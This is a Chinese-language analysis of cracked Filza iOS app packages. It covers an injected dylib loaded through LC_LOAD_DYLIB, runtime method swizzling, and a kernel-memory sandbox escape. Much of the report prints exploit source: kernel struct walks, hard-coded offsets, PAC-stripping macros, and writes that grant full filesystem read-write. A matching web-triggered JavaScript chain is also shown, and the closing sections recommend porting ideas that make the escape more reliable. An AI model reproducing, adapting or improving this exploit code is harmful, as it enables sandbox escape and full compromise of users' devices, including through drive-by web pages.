## 问题 1：App 通过什么注入？

### 1.1 注入方式：`LC_LOAD_DYLIB`（**不是** MobileSubstrate）

`Filza_IPA_逆向报告_反汇编版.md` 与源码双向确认：

**主程序 `Filza` 的 `LC_LOAD_DYLIB` 里被硬编码插入了加载项**：

```
@executable_path/Frameworks/FilzaApplySandboxExt.dylib
```

**证据**：
- 含 dylib 的 6 个样本，主程序都有这一项
- `Filza_4.0_NoUS_Crack 2` / `Filza_4.0.0_Crack_OK 2` **没有这一项**，包内也无该 dylib
  → 这是它们"相对干净"的机械原因

**双路径兼容**（Slop 1.2.0 字符串）：

```
/Library/MobileSubstrate/DynamicLibraries/FilzaApplySandboxExt.dylib
```

即**同时支持** `@executable_path` 与越狱环境的 MS 布局。

### 1.2 生效范围：Bundle 白名单

`FilzaApplySandboxExt.plist`（Theos tweak 过滤器）：

```xml
{ Filter = { Bundles = ( "com.tigisoftware.Filza",
                         "com.apple.mobile.MobileHouseArrest" ); }; }
```

**两个 Bundle 都注入** —— 后者正是 MHA 伪装的私有身份。

`Makefile` 亦声明：

```make
FilzaApplySandboxExt_INSTALL_TARGET_PROCESSES = Filza
```

### 1.3 Hook 方式：**运行时 ObjC 方法替换**（关键）

**`Tweak.m` 里没有任何 `%hook` 指令**（我全库检索 `^%hook` 零命中）。
改用 `installHooks()` 手工安装：

```objc
static void installHooks(void) {
    Class preferences = NSClassFromString(@"TGPreferences");
    if (preferences) {
        Method defaultPath = class_getInstanceMethod(preferences,
                                NSSelectorFromString(@"defaultPath"));
        if (defaultPath) method_setImplementation(defaultPath, (IMP)hook_defaultPath);
    }

    Class fileSystemController = NSClassFromString(@"TGFileSystemListViewController");
    if (fileSystemController) {
        Method setCurrentPath = class_getInstanceMethod(fileSystemController,
                                  NSSelectorFromString(@"setCurrentPath:"));
        if (setCurrentPath) {
            orig_fileSystemSetCurrentPath = method_getImplementation(setCurrentPath);
            method_setImplementation(setCurrentPath, (IMP)hook_fileSystemSetCurrentPath);
        }
        // ... 另有 8 个同类替换
    }
    // ...
}
```

**技术要点**：

| 项 | 做法 |
|---|---|
| 类查找 | `NSClassFromString(@"TGPreferences")` —— **运行时按名查，不链接** |
| 方法获取 | `class_getInstanceMethod` |
| 保存原实现 | `method_getImplementation` → 存到 `orig_*` 全局变量 |
| 替换 | `method_setImplementation` |
| 处理继承方法 | `class_addMethod` 失败才 fallback 到 `method_setImplementation`（见 `updateEditableUI` 注释） |

**为什么不用 `%hook`**：`%hook` 需要编译期知道类名，
而 Filza 的类（`TG*` 前缀）是私有的、版本间会变。
**运行时替换更抗更新**，且允许"类不存在就跳过"（所有 hook 都有 `if (xxx)` 保护）。

### 1.4 入口

```objc
#pragma mark - Entry Point

__attribute__((constructor)) void TweakInit(void) {
    installHooks();
    runMCMPath();
    scheduleInitialBrowserRepair(8);
    FSUpdateCheckerStart();
}
```

`__attribute__((constructor))` —— dylib 被 dyld 加载时**自动执行**。

### 2.2 沙箱逃逸的实现方式（**核心**）

`sandbox_escape.m` 头部原文：

```objc
/*
 * sandbox_escape.m — Sandbox escape via kernel memory patching
 *
 * Walk proc_ro → ucred → cr_label → sandbox → ext_set → ext_table
 * Patch extension paths to "/", rewrite class to "com.apple.app-sandbox.read-write"
 * Fill all 16 hash slots → full R+W filesystem access
 * Based on 18.3_sandbox/root.m by CrazyMind90.
 */
```

**三步**：

| 步骤 | 代码 | 效果 |
|---|---|---|
| ① 改路径 | `patch_chain()` → 把 `ext` 的数据改成 `"/"` | 撤掉路径限制 |
| ② 改类别 | `set_rw_class()` → 改写为 `read-write` | 从只读变读写 |
| ③ 填满槽位 | `Fill all 16 hash slots` | **不限于任何特定路径** |

实现（`sandbox_escape.m`，**逐行核实**）：

```objc
// ---- 核心：把扩展的路径改成 "/"，并把长度标志位写满 ----
static void patch_ext(uint64_t ext) {
    uint64_t da = early_kread64(ext + OFF_EXT_DATA);      // +0x40 data_addr
    uint64_t dl = early_kread64(ext + OFF_EXT_DATALEN);   // +0x48 data_len
    if (K(da) && dl > 0) {
        uint8_t buf[KRW_LEN];
        early_kread(da, buf, KRW_LEN);
        buf[0] = '/'; buf[1] = 0;                        // ★ 路径字面写成 "/"
        early_kwrite32bytes(da, buf);
    }
    uint8_t chunk[KRW_LEN];
    early_kread(ext + OFF_EXT_DATA, chunk, KRW_LEN);
    *(uint64_t*)(chunk + 0x08) = 1;                       // ★ 标志位置 1
    *(uint64_t*)(chunk + 0x10) = 0xFFFFFFFFFFFFFFFFULL;   // ★ 长度拉满
    early_kwrite32bytes(ext + OFF_EXT_DATA, chunk);
}

// ---- 遍历扩展链，逐个 patch ----
static int patch_chain(uint64_t hdr) {
    int n = 0;
    for (int i = 0; i < 64 && K(hdr); i++) {              // 上限 64，防死循环
        uint64_t ext = S(early_kread64(hdr + 0x8));
        if (K(ext)) { patch_ext(ext); n++; }
        uint64_t next = early_kread64(hdr);
        if (!next || !K(next)) break;
        hdr = S(next);
    }
    return n;
}

// ---- 把类别字符串改成 read-write ----
static void set_rw_class(uint64_t hdr) {
    uint64_t ext = S(early_kread64(hdr + 0x8));
    if (!K(ext)) return;
    uint64_t da = early_kread64(ext + OFF_EXT_DATA);
    if (!K(da)) return;

    const char *rw = "com.apple.app-sandbox.read-write";
    uint8_t b1[KRW_LEN], b2[KRW_LEN];
    memset(b1, 0, KRW_LEN); memset(b2, 0, KRW_LEN);
    memcpy(b1, rw, KRW_LEN);
    early_kwrite32bytes(da + 32, b1);                     // ★ 写入类别串
    early_kwrite32bytes(da + 64, b2);                     // 清后续
    uint8_t hb[KRW_LEN];
    early_kread(hdr, hb, KRW_LEN);
    *(uint64_t*)(hb + 0x10) = da + 32;                    // ★ 更新指向
    early_kwrite32bytes(hdr, hb);
}
```

**三个关键写入**：

| 位置 | 写入内容 | 效果 |
|---|---|---|
| `da[0..1]` | `'/'`, `0` | **路径限制变成根目录** |
| `ext+0x40+0x08` / `+0x10` | `1` / `0xFFFF...FF` | 标志置位 + 长度拉满 |
| `da + 32` | `"com.apple.app-sandbox.read-write"` | **类别改成读写** |

**主流程**：

```objc
uint64_t proc_ro_raw = early_kread64(self_proc + OFF_PROC_PROC_RO);   // +0x18
uint64_t proc_ro     = S(proc_ro_raw);
uint64_t ucred       = early_kread64(proc_ro + OFF_PROC_RO_UCRED);    // +0x20
uint64_t label       = S(early_kread64(ucred + OFF_UCRED_CR_LABEL));  // +0x78
uint64_t sandbox     = S(early_kread64(label + OFF_LABEL_SANDBOX));   // +0x10
uint64_t ext_set     = S(early_kread64(sandbox + OFF_SANDBOX_EXT_SET));// +0x10

for (int s = 0; s < 16; s++) {                       // 16 个扩展槽
    uint64_t hdr = S(early_kread64(ext_set + s * 8));
    if (K(hdr)) patched += patch_chain(hdr);         // 逐个 patch
}
for (int s = 0; s < 16; s++) {
    uint64_t hdr = S(early_kread64(ext_set + s * 8));
    if (K(hdr) && K(early_kread64(hdr + 0x10))) { set_rw_class(hdr); classed++; }
}
// 把空的 hash 槽全部指向同一个有效扩展
uint64_t src = 0;
for (int s = 0; s < 16 && !src; s++) { uint64_t h = S(early_kread64(ext_set + s * 8)); if (K(h)) src = h; }
if (src) {
    for (int s = 0; s < 16; s++) {
        uint64_t h = early_kread64(ext_set + s * 8);
        if (!h || !K(h)) { early_kwrite64(ext_set + s * 8, src); filled++; }
    }
}
```

**注意 `S()` 宏**（PAC 处理）：

```objc
#define S(x) ({ uint64_t _v = __xpaci_sbx(x); \
    ((_v >> 32) > 0xFFFF ? (_v | pac_mask) : _v); })
#define K(x) ((x) > VM_MIN_KERNEL_ADDRESS)
```

`__xpaci_sbx` 剥离 PAC，`| pac_mask` 还原高位——
与 JS 侧 `lsr x9, x0, #0x30` + `csel` 是同一套 PAC 处理思路。

**验证手段**（代码自带）：

```objc
int fd_w = open("/var/mobile/.sbx_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
```

### 2.3 偏移表（`sandbox_escape.m` 硬编码，注释写明来源）

```objc
// Verified offsets (IDA binary analysis across 6 kernelcaches)
#define OFF_PROC_PROC_RO       0x18  // proc → proc_ro (stable 17.0-26.x)
#define OFF_PROC_RO_UCRED      0x20  // proc_ro → p_ucred (verified all versions)
#define OFF_UCRED_CR_LABEL     0x78  // ucred → cr_label (KDK struct dump)
#define OFF_LABEL_SANDBOX      0x10  // label → sandbox (MAC l_perpolicy[1])
#define OFF_SANDBOX_EXT_SET    0x10  // sandbox → ext_set
#define OFF_EXT_DATA           0x40  // ext → data_addr
#define OFF_EXT_DATALEN        0x48  // ext → data_len
```

## 问题 3：能否参考 JS 侧的逻辑实现？

### 3.1 结论：**能，而且两边本来就是同一套逻辑**

**这是本轮最重要的发现：原生侧和 JS 侧做的是同一件事，偏移链完全一致。**

### 3.2 偏移链逐级对照

| 层级 | JS 侧（`pe_main.js:6656+`） | 原生侧（`sandbox_escape.m`） | 是否一致 |
|---|---|---|---|
| proc → proc_ro | `read64(ourProcAddr + 0x18n)` | `OFF_PROC_PROC_RO 0x18` | ✅ |
| proc_ro → ucred | `read64(credRefAddr + 0x28n)` | `OFF_PROC_RO_UCRED 0x20` | ⚠️ **见 §3.3** |
| ucred → label | `read64(credAddr + 0x78n)` | `OFF_UCRED_CR_LABEL 0x78` | ✅ |
| label → sandbox | `read64(labelAddr + 0x8n + 1n*8n)` = `+0x10` | `OFF_LABEL_SANDBOX 0x10` | ✅ |
| sandbox → ext_set | `read64(sandboxAddr + 0x10n)` | `OFF_SANDBOX_EXT_SET 0x10` | ✅ |
| ext_set → ext_table | `ext_setAddr + 0x0n` | `ext_table`（注释 `koffsetof=0x0`） | ✅ |
| ext_hdr → ext_lst | `+0x8n` | `hdr + 0x8` | ✅ |
| ext → data | — | `OFF_EXT_DATA 0x40` | JS 侧走另一条路 |

**JS 侧原文**：

```js
let credRefAddr = libs_Chain_Chain...read64(ourProcAddr + 0x18n);
credRefAddr = credRefAddr + 0x28n;
let credAddr = libs_Chain_Chain...read64(credRefAddr);
let labelAddr = libs_Chain_Chain...read64(credAddr + 0x78n);
let sandboxAddr = libs_Chain_Chain...read64(
    labelAddr + 0x8n + 1n * BigInt(UINT64_SIZE));      // = +0x10
let ext_setAddr = libs_Chain_Chain...read64(sandboxAddr + 0x10n);
let ext_tableAddr = ext_setAddr + 0x0n;
```

### 3.3 ⚠️ 唯一差异：JS 侧多一个中间层

| | 层次 | 偏移 |
|---|---|---|
| **原生侧** | `proc → proc_ro → ucred` | `+0x18` → `+0x20` |
| **JS 侧** | `proc → cred_ref → cred` | `+0x18` → `+0x28` |

**解读**：两边的结构体布局理解略有不同——
原生侧认为是 `proc_ro.p_ucred`（0x20），JS 侧认为是先取一层再 `+0x28`。

**可能是**：
- 不同 iOS 版本的 `proc_ro` 布局差异
- 或其中一方的偏移是针对特定版本校准的

**这不影响可移植性**，只说明**移植时要按目标版本校准这一步**。

### 3.4 差异对照表：两条路的取舍

| 维度 | 原生侧（dylib） | JS 侧（pe_main） |
|---|---|---|
| **内核 R/W 来源** | `krw.m`（ICMPv6 socket + 硬编码偏移） | `chain_write/read64`（同源，ICMPv6） |
| **逃逸方式** | 改 `ext` 的 data 为 `"/"` + 改 class | 改 `ext_table` 的 hash 槽指向 |
| **逃逸粒度** | **全盘 R+W**（填满 16 槽） | 按路径逐条 token |
| **需要越狱** | ✅ 需要（装 dylib） | ❌ 不需要（网页触发） |
| **自动化** | ❌ 需人工 | ✅ 全自动 |
| **版本约束** | `17.0–26.0.x`（`offsets_init` 门禁） | 18.4/18.4.1 完整 |
| **代码量** | `sandbox_escape.m` ~300 行 | `applySandboxEscape()` ~90 行 |

### 3.5 移植可行性评估

| 目标 | 可行性 | 说明 |
|---|---|---|
| **把 JS 的逃逸逻辑搬到原生** | ✅ **高** | 偏移链一致，改写 `ext_table` hash 槽逻辑 |
| **把原生的逃逸逻辑搬到 JS** | ✅ **高** | "填满 16 槽"比逐条 token 更彻底，值得移植 |
| **共用一份偏移表** | ⚠️ **中** | 需先解决 §3.3 的 `+0x20` vs `+0x28` 差异 |
| **共用内核 R/W** | ❌ 不可 | JS 靠网页触发，原生靠 dylib 加载，环境不同 |

### 3.6 ★ 可移植的具体改进（JS → 原生）

**原生侧可以借鉴 JS 侧的"填满 hash 槽"思路**——实际上**它已经借鉴了**
（`Fill all 16 hash slots → full R+W filesystem access`，
注释也写了 `Based on 18.3_sandbox/root.m by CrazyMind90`）。

**反过来，原生侧可以补 JS 侧有而自己缺的**：

| JS 侧有 | 原生侧有吗 | 建议 |
|---|---|---|
| `sandbox_extension_issue_file` + `consume` 先拿一个基准 token | ❌ | ✅ **可补**（JS 是先签发再改表，原生直接改） |
| `confstr(_CS_DARWIN_USER_TEMP_DIR)` 拿临时目录 | ❌ | 可选 |
| 逐条路径 token（74 条字典） | ❌（改表后不需要） | 不需要 |

**JS 侧的 `applySandboxEscape()` 前段**（原生侧缺的）：

```js
let extension = callSymbol("sandbox_extension_issue_file",
                           "com.apple.app-sandbox.read-write",
                           write_file_path, 0n, 0n);
let resConsume = callSymbol("sandbox_extension_consume", extension);
// 先有一个合法扩展，再去改 ext_table
```

**→ 补这个能让原生侧更稳**：先签发一个合法 token 保证 `ext_set` 非空，再改表填槽。

## 四、三问总结

| 问题 | 答案 |
|---|---|
| **1. 注入方式** | `LC_LOAD_DYLIB` 硬编码 `@executable_path/Frameworks/FilzaApplySandboxExt.dylib`；Bundle 白名单（`com.tigisoftware.Filza` + `com.apple.mobile.MobileHouseArrest`）；hook 用 **运行时 `method_setImplementation`**（无 `%hook`）；`__attribute__((constructor))` 入口 |
| **2. 能力与逃逸** | 内核 R/W + 提权 + XPF + APFS + MCM 容器 + 12 个 UI hook；**逃逸 = 走 `proc_ro→ucred→cr_label→sandbox→ext_set→ext_table`，改 `ext` 数据为 `"/"`、class 改 `read-write`、填满 16 个 hash 槽 → 全盘 R+W** |
| **3. 能否照 JS 实现** | **能**。偏移链**逐级一致**（仅 `+0x20` vs `+0x28` 一处差异），两边本就是同一套逻辑的不同语言实现。**原生侧可补 JS 的"先签发基准 token"前段**提升稳定性 |
